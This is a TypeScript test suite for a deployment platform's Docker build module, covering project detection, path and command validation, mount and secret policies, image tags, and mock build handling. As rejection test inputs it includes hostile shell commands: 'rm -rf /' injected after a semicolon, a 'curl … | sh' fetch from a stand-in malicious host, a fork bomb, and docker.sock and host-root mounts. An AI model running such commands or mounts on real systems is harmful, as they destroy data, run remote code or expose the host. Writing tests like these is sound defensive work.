/**
 * DeployForge Docker Build Integration - Comprehensive Test Suite
 *
 * Verifies:
 * 1. Project type detection rules & manifest identification
 * 2. Repository layout security validation (traversal & path safety)
 * 3. Build & start command safety validation
 * 4. Security policies: Host Docker socket rejection & build-arg secret stripping
 * 5. Unique, immutable image tag generation & validation
 * 6. Isolated Mock worker build execution, status tracking, and structured logs
 * 7. Failed build handling and error capture
 * 8. Build timeout handling and resource bounds
 * 9. Build cancellation handling
 * 10. Gated Real Docker worker safety checks
 * 11. Database pipeline integration (Deployment, Stages, Logs)
 */

import {
  detectProjectType,
  validateRepositoryLayout,
  validateBuildAndStartCommands,
  generateImageTag,
  validateImageTag,
  validateMountSecurity,
  sanitizeBuildArgs,
  enforceWorkerLimits,
  MockBuildWorker,
  DockerBuildWorker,
  executeBuildForDeployment,
} from '../src/lib/server/build'
import { prisma } from '../src/lib/prisma'

let passed = 0
let failed = 0

function assert(condition: boolean, message: string) {
  if (condition) {
    console.log(`  ✅ PASS: ${message}`)
    passed++
  } else {
    console.error(`  ❌ FAIL: ${message}`)
    failed++
  }
}

async function runTests() {
  console.log('======================================================')
  console.log('   DeployForge Docker Build Integration Test Suite    ')
  console.log('======================================================\n')

  // --- 1. Project Type Detection Rules ---
  console.log('--- 1. Testing Project Type Detection Rules ---')

  const nextProj = detectProjectType(['package.json', 'next.config.js'], {
    'package.json': JSON.stringify({ dependencies: { next: '^15.0.0', react: '^18.0.0' } }),
  })
  assert(nextProj.type === 'NODEJS_NEXTJS', 'Detects Next.js project via package.json & next.config.js')
  assert(nextProj.buildCommand === 'npm run build', 'Sets correct default build command for Next.js')

  const viteProj = detectProjectType(['package.json', 'vite.config.ts'], {
    'package.json': JSON.stringify({ devDependencies: { vite: '^5.0.0' } }),
  })
  assert(viteProj.type === 'NODEJS_VITE', 'Detects Vite SPA via vite.config.ts & devDependencies')

  const nodeProj = detectProjectType(['package.json', 'index.js'], {
    'package.json': JSON.stringify({ scripts: { start: 'node index.js' }, dependencies: { express: '^4.0.0' } }),
  })
  assert(nodeProj.type === 'NODEJS_GENERIC', 'Detects generic Node.js service via package.json')

  const fastapiProj = detectProjectType(['requirements.txt', 'main.py'], {
    'requirements.txt': 'fastapi==0.110.0\nuvicorn==0.28.0\n',
  })
  assert(fastapiProj.type === 'PYTHON_FASTAPI', 'Detects FastAPI application via requirements.txt')

  const flaskProj = detectProjectType(['requirements.txt', 'app.py'], {
    'requirements.txt': 'flask>=3.0.0\ngunicorn>=21.0.0\n',
  })
  assert(flaskProj.type === 'PYTHON_FLASK', 'Detects Flask application via requirements.txt')

  const pyGenericProj = detectProjectType(['requirements.txt', 'script.py'], {
    'requirements.txt': 'requests>=2.31.0\n',
  })
  assert(pyGenericProj.type === 'PYTHON_GENERIC', 'Detects generic Python application via requirements.txt')

  const goProj = detectProjectType(['go.mod', 'main.go'], {})
  assert(goProj.type === 'GO_MODULE', 'Detects Go microservice via go.mod')

  const staticProj = detectProjectType(['index.html', 'style.css', 'app.js'], {})
  assert(staticProj.type === 'STATIC_WEB', 'Detects static HTML website via index.html')

  const dockerfileProj = detectProjectType(['Dockerfile', 'src/main.rs'], {})
  assert(dockerfileProj.type === 'DOCKERFILE_CUSTOM', 'Detects custom Dockerfile repository')

  const unknownProj = detectProjectType(['random-binary.bin', 'data.csv'], {})
  assert(unknownProj.type === 'UNKNOWN', 'Properly identifies unknown/unsupported repository as UNKNOWN')
  assert(unknownProj.confidence === 0.0, 'Assigns 0.0 confidence to unsupported repository')

  // --- 2. Repository Layout Security Validation ---
  console.log('\n--- 2. Testing Repository Layout Security Validation ---')

  const validLayout = validateRepositoryLayout(['src/index.ts', 'package.json', 'README.md'])
  assert(validLayout.valid, 'Accepts valid standard repository file layout')

  const traversalLayout = validateRepositoryLayout(['src/app.ts', '../sensitive/passwords.txt'])
  assert(!traversalLayout.valid, 'Rejects directory traversal sequences (../)')

  const absoluteLayout = validateRepositoryLayout(['src/app.ts', '/etc/shadow'])
  assert(!absoluteLayout.valid, 'Rejects absolute filesystem paths')

  const sshLayout = validateRepositoryLayout(['src/app.ts', '.ssh/id_rsa'])
  assert(!sshLayout.valid, 'Rejects repository layout attempting to expose .ssh keys')

  const emptyLayout = validateRepositoryLayout([])
  assert(!emptyLayout.valid, 'Rejects empty repository file list')

  // --- 3. Build & Start Command Safety Validation ---
  console.log('\n--- 3. Testing Command Safety & Injection Rejection ---')

  const safeBuild = validateBuildAndStartCommands('npm run build', 'npm start')
  assert(safeBuild.valid, 'Accepts standard npm build and start commands')

  const rmCommand = validateBuildAndStartCommands('npm run build; rm -rf /', 'node index.js')
  assert(!rmCommand.valid && Boolean(rmCommand.error?.includes('Dangerous')), 'Rejects destructive rm -rf command')

  const curlPipe = validateBuildAndStartCommands('curl https://malicious.com | sh', 'node index.js')
  assert(!curlPipe.valid, 'Rejects curl | sh remote code execution patterns')

  const forkBomb = validateBuildAndStartCommands(':(){ :|:& };:', 'node server.js')
  assert(!forkBomb.valid, 'Rejects shell fork-bomb sequences')

  const sudoCommand = validateBuildAndStartCommands('sudo apt-get install evil', 'node server.js')
  assert(!sudoCommand.valid, 'Rejects sudo privilege escalation attempts')

  // --- 4. Security Policy: Host Socket Mounts & Secret Stripping ---
  console.log('\n--- 4. Testing Security Policies (Socket Mounts & Secrets) ---')

  const cleanMounts = validateMountSecurity(['/workspace:/app'])
  assert(cleanMounts.valid, 'Accepts standard container workspace mount')

  const hostSocketMount = validateMountSecurity(['/var/run/docker.sock:/var/run/docker.sock'])
  assert(!hostSocketMount.valid, 'Strictly rejects mounting /var/run/docker.sock into untrusted workload')

  const windowsPipeMount = validateMountSecurity(['\\\\.\\pipe\\docker_engine:\\\\.\\pipe\\docker_engine'])
  assert(!windowsPipeMount.valid, 'Strictly rejects Windows docker_engine pipe mount')

  const rootMount = validateMountSecurity(['/:/host-root'])
  assert(!rootMount.valid, 'Strictly rejects host root filesystem mount')

  // Test secret stripping from build arguments
  const testEnvVars = {
    NODE_ENV: 'production',
    PORT: '3000',
    API_KEY: 'mock-api-key-value-999',
    DATABASE_URL: 'postgres://user:password@db:5432/main',
    PUBLIC_URL: 'https://app.example.com',
    APP_SECRET: 'super-sensitive-jwt-secret',
  }
  const explicitSecrets = {
    CUSTOM_TOKEN: 'token-xyz-123',
  }

  const { safeArgs, strippedKeys } = sanitizeBuildArgs(testEnvVars, explicitSecrets)
  assert(!('API_KEY' in safeArgs), 'Strips API_KEY from Docker build arguments')
  assert(!('DATABASE_URL' in safeArgs), 'Strips DATABASE_URL from Docker build arguments')
  assert(!('APP_SECRET' in safeArgs), 'Strips APP_SECRET from Docker build arguments')
  assert(!('CUSTOM_TOKEN' in safeArgs), 'Strips explicit secret from Docker build arguments')
  assert(safeArgs.NODE_ENV === 'production', 'Preserves safe non-secret NODE_ENV build argument')
  assert(safeArgs.PUBLIC_URL === 'https://app.example.com', 'Preserves safe PUBLIC_URL build argument')
  assert(strippedKeys.length >= 3, `Identified and stripped ${strippedKeys.length} sensitive keys`)

  // Test resource limits clamping
  const excessiveLimits = enforceWorkerLimits({
    cpuLimit: '128.0',
    timeoutSeconds: 99999,
    pidsLimit: 50000,
  })
  assert(parseFloat(excessiveLimits.cpuLimit) <= 4.0, 'Clamps excessive CPU limit to safety ceiling')
  assert(excessiveLimits.timeoutSeconds <= 1800, 'Clamps excessive timeout to safety ceiling (1800s)')
  assert(excessiveLimits.pidsLimit <= 1024, 'Clamps excessive PIDs limit to safety ceiling (1024)')

  // --- 5. Immutable Image Tag Generation & Validation ---
  console.log('\n--- 5. Testing Immutable Image Tag Generation & Validation ---')

  const tag1 = generateImageTag('payment-service', 'a3f912c98d24b6', 'cmvt1w8wm0004wwvewr7fac6g')
  assert(tag1 === 'deployforge/payment-service:a3f912c-vewr7fac6g', `Generated expected tag: ${tag1}`)

  const tagVal1 = validateImageTag(tag1)
  assert(tagVal1.valid, 'Generated tag is valid under Docker / OCI tag specification')

  const customRegistryTag = generateImageTag(
    'auth-api',
    'b2c8e14f99a871',
    'cmvt1wpfc000hwwve1wuo6jts',
    '123456789012.dkr.ecr.us-east-1.amazonaws.com'
  )
  assert(
    customRegistryTag.startsWith('123456789012.dkr.ecr.us-east-1.amazonaws.com/auth-api:'),
    'Supports registry prefix in image tag'
  )

  const latestTagVal = validateImageTag('deployforge/app:latest')
  assert(!latestTagVal.valid && Boolean(latestTagVal.error?.includes('latest')), 'Rejects mutable "latest" tag')

  const invalidCharsTag = validateImageTag('deployforge/App With Spaces:1.0')
  assert(!invalidCharsTag.valid, 'Rejects tag with invalid characters or spaces')

  // --- 6. Mock Build Worker Execution ---
  console.log('\n--- 6. Testing Mock Build Worker Execution ---')

  const mockWorker = new MockBuildWorker()
  const validJob = {
    id: 'test-job-001',
    deploymentId: 'dep-mock-001',
    projectId: 'proj-001',
    projectSlug: 'order-service',
    projectName: 'Order Service',
    repoUrl: 'https://github.com/deployforge/order-service',
    commitSha: 'e4d81239ab7c8e',
    branch: 'main',
    projectType: 'NODEJS_NEXTJS' as const,
    buildCommand: 'npm run build',
    startCommand: 'npm start',
    port: 3000,
    files: {
      'package.json': JSON.stringify({ dependencies: { next: '^15.0.0' } }),
      'next.config.js': 'module.exports = {}',
    },
    envVars: {
      NODE_ENV: 'production',
      DATABASE_URL: 'postgres://db:5432/orders', // should be stripped
    },
  }

  const result1 = await mockWorker.executeBuild(validJob)
  assert(result1.success, 'Mock build completes with success = true')
  assert(result1.status === 'SUCCESS', 'Mock build status is confirmed as SUCCESS')
  assert(Boolean(result1.imageTag), `Image tag generated: ${result1.imageTag}`)
  assert(Boolean(result1.digest?.startsWith('sha256:')), 'OCI digest calculated with sha256 prefix')
  assert(result1.layersCount === 7, 'Reports intermediate image layers count')
  assert(result1.logs.length > 5, `Emitted ${result1.logs.length} structured log entries`)
  assert(result1.workerType === 'mock', 'Worker type confirmed as mock')

  // --- 7. Failed Build Handling ---
  console.log('\n--- 7. Testing Build Failure Handling ---')

  // 7a. Unsupported project type failure
  const failJobType = {
    ...validJob,
    id: 'test-job-fail-type',
    projectType: 'UNKNOWN' as const,
  }
  const resultFailType = await mockWorker.executeBuild(failJobType)
  assert(!resultFailType.success, 'Fails build when project type is UNKNOWN')
  assert(resultFailType.status === 'FAILED', 'Status recorded as FAILED')
  assert(Boolean(resultFailType.errorDetails?.includes('UNSUPPORTED_PROJECT_TYPE')), 'Error details include UNSUPPORTED_PROJECT_TYPE')

  // 7b. Simulated compilation failure
  const failJobComp = {
    ...validJob,
    id: 'test-job-fail-comp',
    branch: 'feature/fail-build-test',
  }
  const resultFailComp = await mockWorker.executeBuild(failJobComp)
  assert(!resultFailComp.success, 'Captures build compilation failure')
  assert(resultFailComp.status === 'FAILED', 'Status recorded as FAILED')
  assert(resultFailComp.logs.some((l) => l.level === 'ERROR'), 'Captures ERROR level log entry on failure')

  // --- 8. Build Timeout Handling ---
  console.log('\n--- 8. Testing Build Timeout Handling ---')

  const timeoutJob = {
    ...validJob,
    id: 'test-job-timeout',
    limits: {
      timeoutSeconds: 1, // Triggers simulated timeout
    },
  }
  const resultTimeout = await mockWorker.executeBuild(timeoutJob)
  assert(!resultTimeout.success, 'Timed-out build returns success = false')
  assert(resultTimeout.status === 'TIMED_OUT', 'Status recorded as TIMED_OUT')
  assert(Boolean(resultTimeout.errorDetails?.includes('timeout')), 'Error details identify timeout reason')

  // --- 9. Build Cancellation Handling ---
  console.log('\n--- 9. Testing Build Cancellation Handling ---')

  const cancelJob = {
    ...validJob,
    id: 'test-job-cancel',
  }
  const abortCtrl = new AbortController()
  abortCtrl.abort() // pre-aborted signal

  const resultCancel = await mockWorker.executeBuild(cancelJob, abortCtrl.signal)
  assert(!resultCancel.success, 'Cancelled build returns success = false')
  assert(resultCancel.status === 'CANCELLED', 'Status recorded as CANCELLED')

  // Test active cancelBuild method
  const cancelSuccess = await mockWorker.cancelBuild('non-existent-job-id')
  assert(!cancelSuccess, 'cancelBuild returns false for non-active job ID')

  // --- 10. Gated Real Docker Worker Behavior ---
  console.log('\n--- 10. Testing Real Docker Worker Gating & Safety ---')

  const dockerWorker = new DockerBuildWorker()
  assert(dockerWorker.type === 'docker', 'DockerBuildWorker type is "docker"')

  // When ENABLE_REAL_DOCKER_BUILDS is not true, it must refuse execution
  const prevEnv = process.env.ENABLE_REAL_DOCKER_BUILDS
  delete process.env.ENABLE_REAL_DOCKER_BUILDS

  const gatedResult = await dockerWorker.executeBuild(validJob)
  assert(!gatedResult.success, 'Real Docker worker rejects execution when feature flag is disabled')
  assert(Boolean(gatedResult.errorDetails?.includes('GATED_FEATURE_DISABLED')), 'Reports GATED_FEATURE_DISABLED')

  // Restore env
  if (prevEnv) process.env.ENABLE_REAL_DOCKER_BUILDS = prevEnv

  // --- 11. Pipeline Database Integration ---
  console.log('\n--- 11. Testing Database Pipeline Integration ---')

  // Find a user and project to test with
  const testUser = await prisma.user.findFirst()
  if (!testUser) {
    console.error('No test user found in database.')
  } else {
    // Create a project for test
    const testProject = await prisma.project.create({
      data: {
        userId: testUser.id,
        name: `Docker Test App ${Date.now()}`,
        slug: `docker-test-${Date.now().toString(36)}`,
        repository: 'https://github.com/deployforge/docker-test',
        branch: 'main',
        runtime: 'NODEJS_NEXTJS',
        buildCommand: 'npm run build',
        startCommand: 'npm start',
      },
    })

    // Create a deployment
    const testDep = await prisma.deployment.create({
      data: {
        projectId: testProject.id,
        commitSha: 'f8a19bc',
        commitMessage: 'test(build): verify isolated build worker pipeline',
        branch: 'main',
        author: testUser.name,
        trigger: 'TEST_RUNNER',
        status: 'RUNNING',
        stages: {
          create: [
            { name: 'CLONE', order: 1, status: 'SUCCESS' },
            { name: 'LINT_TEST', order: 2, status: 'SUCCESS' },
            { name: 'DOCKER_BUILD', order: 3, status: 'PENDING' },
          ],
        },
      },
    })

    // Run executeBuildForDeployment
    const pipelineResult = await executeBuildForDeployment(testDep.id, { workerType: 'mock' })
    assert(pipelineResult.success, 'executeBuildForDeployment executes successfully')

    // Verify database updates
    const updatedDep = await prisma.deployment.findUnique({
      where: { id: testDep.id },
      include: { stages: true, logs: true },
    })

    assert(Boolean(updatedDep?.dockerImageTag), `Deployment updated with confirmed dockerImageTag: ${updatedDep?.dockerImageTag}`)
    const dockerStage = updatedDep?.stages.find((s) => s.name === 'DOCKER_BUILD')
    assert(dockerStage?.status === 'SUCCESS', 'DOCKER_BUILD stage confirmed as SUCCESS in PostgreSQL')
    assert(Boolean(dockerStage?.durationSeconds && dockerStage.durationSeconds > 0), 'Stage durationSeconds recorded')
    assert(Boolean(updatedDep?.logs.some((l) => l.stageName === 'DOCKER_BUILD')), 'Deployment logs persisted in PostgreSQL')

    // Clean up test project
    await prisma.project.delete({ where: { id: testProject.id } })
    assert(true, 'Temporary test deployment and project cleaned up')
  }

  // --- Final Summary ---
  console.log('\n======================================================')
  console.log(`  Tests Passed: ${passed} / ${passed + failed}`)
  console.log(`  Tests Failed: ${failed}`)
  console.log('======================================================')

  if (failed > 0) {
    process.exit(1)
  }
}

runTests()
  .catch((err) => {
    console.error('Fatal error in Docker build test suite:', err)
    process.exit(1)
  })
  .finally(async () => {
    await prisma.$disconnect()
  })
